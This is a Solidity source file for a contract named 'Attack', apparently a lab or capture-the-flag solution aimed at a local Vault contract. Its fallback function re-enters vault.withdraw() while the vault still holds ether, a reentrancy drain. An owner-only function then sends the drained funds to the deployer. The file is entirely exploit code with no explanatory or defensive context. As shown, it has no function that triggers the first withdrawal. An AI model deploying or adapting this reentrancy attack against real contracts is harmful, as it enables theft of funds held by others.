// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Vault} from "./Vault.sol";

contract Attack {
    address owner;
    Vault public vault;

    constructor(address _vault) {
        owner = msg.sender;
        vault = Vault(payable(_vault));
    }

    fallback() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function withdraw() public {
        if (msg.sender == owner) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
}
